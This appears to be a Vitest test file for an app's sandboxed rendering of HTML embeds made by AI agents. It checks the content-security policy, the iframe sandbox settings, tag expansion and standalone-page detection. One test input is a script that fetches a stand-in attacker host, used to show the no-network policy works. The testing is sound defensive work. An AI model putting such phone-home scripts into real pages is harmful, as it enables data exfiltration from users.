import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { buildEmbedDocument, EMBED_CONTENT_SECURITY_POLICY, expandAgentEmbedTags, isStandaloneHtmlDocument } from "./htmlEmbedDocument";

describe("interactive HTML embeds", () => {
  it("puts the no-network policy before any page code so an embed cannot phone home or touch the app", () => {
    const doc = buildEmbedDocument("<script>fetch('https://evil.example')</script>", null);
    expect(doc.indexOf("Content-Security-Policy")).toBeLessThan(doc.indexOf("evil.example"));
    expect(EMBED_CONTENT_SECURITY_POLICY).toContain("connect-src 'none'");
    expect(EMBED_CONTENT_SECURITY_POLICY).toContain("default-src 'none'");
    expect(EMBED_CONTENT_SECURITY_POLICY).not.toMatch(/https?:/);
  });

  it("points relative images at the embedded file's folder", () => {
    expect(buildEmbedDocument("<img src='a.png'>", "zorai-media://local/w/")).toContain('<base href="zorai-media://local/w/">');
  });

  it("turns agent-embed tags into embed blocks, like Antigravity, but leaves tags quoted inside code fences alone", () => {
    const markdown = 'Here it is:\n<agent-embed src="file:///home/me/anim.html"></agent-embed>\n```html\n<agent-embed src="x.html"></agent-embed>\n```';
    const expanded = expandAgentEmbedTags(markdown);
    expect(expanded).toContain("```agent-embed\nfile:///home/me/anim.html\n```");
    expect(expanded).toContain('```html\n<agent-embed src="x.html"></agent-embed>\n```');
    expect(expandAgentEmbedTags('<agent-embed src="b.html" />')).toContain("```agent-embed\nb.html\n```");
  });

  it("sandboxes embeds with scripts only, never same-origin access to Zorai", () => {
    const source = readFileSync(fileURLToPath(new URL("./HtmlEmbed.tsx", import.meta.url)), "utf8");
    expect(source).toContain('sandbox="allow-scripts"');
    expect(source).not.toContain("allow-same-origin");
  });

  it("renders a complete page an agent pastes into an html code block, but leaves snippets and half-streamed pages as code", () => {
    expect(isStandaloneHtmlDocument("<!DOCTYPE html>\n<html lang=\"en\"><body>hi</body></html>\n")).toBe(true);
    expect(isStandaloneHtmlDocument("<html><body>hi</body></html>")).toBe(true);
    expect(isStandaloneHtmlDocument("<div class=\"card\">snippet</div>")).toBe(false);
    expect(isStandaloneHtmlDocument("<!DOCTYPE html>\n<html><body>still streaming")).toBe(false);
  });
});
